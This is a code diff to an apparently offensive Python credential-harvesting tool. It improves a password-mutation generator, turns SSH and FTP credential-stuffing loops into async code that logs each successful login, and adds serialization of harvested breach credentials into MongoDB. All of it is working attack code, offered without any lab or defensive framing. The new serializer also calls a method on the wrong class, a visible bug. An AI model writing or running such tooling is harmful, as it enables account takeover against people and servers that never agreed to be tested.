@@ -38,6 +38,11 @@ import paramiko
 from smb.SMBConnection import SMBConnection
 import redis
 
+try:
+    import asyncssh
+except ImportError:
+    asyncssh = None
+
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
@@ -310,31 +315,40 @@ class PasswordAnalyzer:
     
     def generate_mutations(self, base_word: str, max_mutations: int = 100) -> List[str]:
         """Generate common password mutations"""
-        mutations = set([base_word])
-        
+        mutations = []
+
         # Capitalization variants
-        mutations.add(base_word.lower())
-        mutations.add(base_word.upper())
-        mutations.add(base_word.capitalize())
-        
+        mutations.append(base_word)
+        mutations.append(base_word.lower())
+        mutations.append(base_word.upper())
+        mutations.append(base_word.capitalize())
+
         # Leet speak
         leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
         leet_word = base_word.lower()
         for char, replacement in leet_map.items():
             leet_word = leet_word.replace(char, replacement)
-        mutations.add(leet_word)
-        
+        if leet_word != base_word.lower():
+            mutations.append(leet_word)
+
         # Append numbers
         for num in ['1', '12', '123', '2024', '2025', '!', '!!', '123!']:
-            mutations.add(base_word + num)
-            mutations.add(base_word.capitalize() + num)
-        
+            mutations.append(base_word + num)
+            mutations.append(base_word.capitalize() + num)
+
         # Prepend
-        for prefix in ['', 'i', 'my']:
-            if prefix:
-                mutations.add(prefix + base_word)
-        
-        return list(mutations)[:max_mutations]
+        for prefix in ['i', 'my']:
+            mutations.append(prefix + base_word)
+
+        # Remove duplicates while preserving order
+        seen = set()
+        unique_mutations = []
+        for mutation in mutations:
+            if mutation not in seen:
+                seen.add(mutation)
+                unique_mutations.append(mutation)
+
+        return unique_mutations[:max_mutations]
     
     def crack_hash(self, password_hash: str, hash_type: str = 'md5', 
                    wordlist: List[str] = None) -> Optional[str]:
@@ -377,73 +391,133 @@ class CredentialStuffer:
         self.failed_attempts = []
         
     async def test_ssh(self, host: str, port: int = 22, timeout: int = 10) -> List[Credential]:
-        """Test credentials against SSH"""
+        """Test credentials against SSH asynchronously"""
         logger.info(f"[*] Testing {len(self.credentials)} credentials on SSH {host}:{port}")
-        
+
         successful = []
-        
+
         for cred in self.credentials[:50]:  # Limit to prevent lockouts
             if not cred.password:
+                await asyncio.sleep(self.rate_limit)
                 continue
-            
+
             try:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                
-                ssh.connect(
-                    host,
-                    port=port,
-                    username=cred.username,
-                    password=cred.password,
-                    timeout=timeout,
-                    allow_agent=False,
-                    look_for_keys=False
-                )
-                
-                logger.info(f"[+] SUCCESS! SSH login: {cred.username}:{cred.password}")
-                cred.verified = True
-                cred.verified_on.append(f'ssh://{host}:{port}')
-                successful.append(cred)
-                
-                ssh.close()
-                
-            except paramiko.AuthenticationException:
-                pass
+                if asyncssh:
+                    # Use asyncssh if available for true async operation
+                    try:
+                        async with asyncssh.connect(
+                            host,
+                            port=port,
+                            username=cred.username,
+                            password=cred.password,
+                            known_hosts=None,
+                            connect_timeout=timeout
+                        ) as conn:
+                            logger.info(f"[+] SUCCESS! SSH login: {cred.username}:{cred.password}")
+                            cred.verified = True
+                            cred.verified_on.append(f'ssh://{host}:{port}')
+                            successful.append(cred)
+                    except asyncssh.PermissionDenied:
+                        pass
+                    except asyncssh.HostKeyNotVerifiable:
+                        # Host key verification failed, but auth might have succeeded
+                        logger.debug(f"[!] Host key verification failed for {host}")
+                else:
+                    # Fallback to synchronous SSH in thread pool if asyncssh not available
+                    loop = asyncio.get_event_loop()
+                    result = await loop.run_in_executor(
+                        None,
+                        self._test_ssh_sync,
+                        host,
+                        port,
+                        cred.username,
+                        cred.password,
+                        timeout
+                    )
+                    if result:
+                        logger.info(f"[+] SUCCESS! SSH login: {cred.username}:{cred.password}")
+                        cred.verified = True
+                        cred.verified_on.append(f'ssh://{host}:{port}')
+                        successful.append(cred)
+
             except Exception as e:
                 logger.debug(f"[!] SSH test error: {str(e)}")
-            
+
             await asyncio.sleep(self.rate_limit)
-        
+
         return successful
+
+    @staticmethod
+    def _test_ssh_sync(host: str, port: int, username: str, password: str, timeout: int) -> bool:
+        """Synchronous SSH test (runs in thread pool)"""
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+            ssh.connect(
+                host,
+                port=port,
+                username=username,
+                password=password,
+                timeout=timeout,
+                allow_agent=False,
+                look_for_keys=False
+            )
+            ssh.close()
+            return True
+        except paramiko.AuthenticationException:
+            return False
+        except Exception:
+            return False
     
     async def test_ftp(self, host: str, port: int = 21, timeout: int = 10) -> List[Credential]:
-        """Test credentials against FTP"""
+        """Test credentials against FTP asynchronously"""
         logger.info(f"[*] Testing credentials on FTP {host}:{port}")
-        
+
         successful = []
-        
+
         for cred in self.credentials[:50]:
             if not cred.password:
+                await asyncio.sleep(self.rate_limit)
                 continue
-            
+
             try:
-                ftp = FTP(timeout=timeout)
-                ftp.connect(host, port)
-                ftp.login(cred.username, cred.password)
-                
-                logger.info(f"[+] SUCCESS! FTP login: {cred.username}:{cred.password}")
-                cred.verified = True
-                cred.verified_on.append(f'ftp://{host}:{port}')
-                successful.append(cred)
-                
-                ftp.quit()
-                
-            except Exception:
-                pass
-            
+                # Run FTP test in thread pool to avoid blocking
+                loop = asyncio.get_event_loop()
+                result = await loop.run_in_executor(
+                    None,
+                    self._test_ftp_sync,
+                    host,
+                    port,
+                    cred.username,
+                    cred.password,
+                    timeout
+                )
+
+                if result:
+                    logger.info(f"[+] SUCCESS! FTP login: {cred.username}:{cred.password}")
+                    cred.verified = True
+                    cred.verified_on.append(f'ftp://{host}:{port}')
+                    successful.append(cred)
+
+            except Exception as e:
+                logger.debug(f"[!] FTP test error: {str(e)}")
+
             await asyncio.sleep(self.rate_limit)
-        
+
         return successful
+
+    @staticmethod
+    def _test_ftp_sync(host: str, port: int, username: str, password: str, timeout: int) -> bool:
+        """Synchronous FTP test (runs in thread pool)"""
+        try:
+            ftp = FTP(timeout=timeout)
+            ftp.connect(host, port)
+            ftp.login(username, password)
+            ftp.quit()
+            return True
+        except Exception:
+            return False
     
     async def test_http_form(self, url: str, username_field: str = 'username', 
                             password_field: str = 'password', 
@@ -581,28 +655,55 @@ class EliteCredentialHarvester:
         return results
     
     def store_results(self, results: Dict):
-        """Store results in MongoDB"""
+        """Store results in MongoDB with proper serialization"""
         try:
             if 'breaches' in results:
                 for breach in results['breaches']:
+                    breach_doc = self._serialize_dataclass(breach)
                     self.breaches_collection.update_one(
-                        {'breach_name': breach.breach_name},
-                        {'$set': breach.__dict__},
+                        {'breach_name': breach_doc['breach_name']},
+                        {'$set': breach_doc},
                         upsert=True
                     )
-            
+
             if 'credentials' in results:
                 for cred in results['credentials']:
+                    cred_doc = self._serialize_dataclass(cred)
                     self.creds_collection.update_one(
-                        {'username': cred.username, 'source': cred.source},
-                        {'$set': cred.__dict__},
+                        {'username': cred_doc['username'], 'source': cred_doc['source']},
+                        {'$set': cred_doc},
                         upsert=True
                     )
-            
+
             logger.info("[+] Results stored in database")
-            
+
         except Exception as e:
             logger.error(f"[!] Storage error: {str(e)}")
+
+    @staticmethod
+    def _serialize_dataclass(obj) -> Dict:
+        """Convert dataclass to MongoDB-compatible dict"""
+        if hasattr(obj, '__dataclass_fields__'):
+            result = {}
+            for field_name, field in obj.__dataclass_fields__.items():
+                value = getattr(obj, field_name)
+
+                # Handle datetime objects
+                if isinstance(value, datetime):
+                    result[field_name] = value.isoformat()
+                # Handle dataclass objects recursively
+                elif hasattr(value, '__dataclass_fields__'):
+                    result[field_name] = CredentialStuffer._serialize_dataclass(value)
+                # Handle lists of dataclasses
+                elif isinstance(value, list):
+                    result[field_name] = [
+                        CredentialStuffer._serialize_dataclass(item) if hasattr(item, '__dataclass_fields__') else item
+                        for item in value
+                    ]
+                else:
+                    result[field_name] = value
+            return result
+        return obj
     
     def export_results(self, filename: str = None) -> str:
         """Export all credentials to file"""
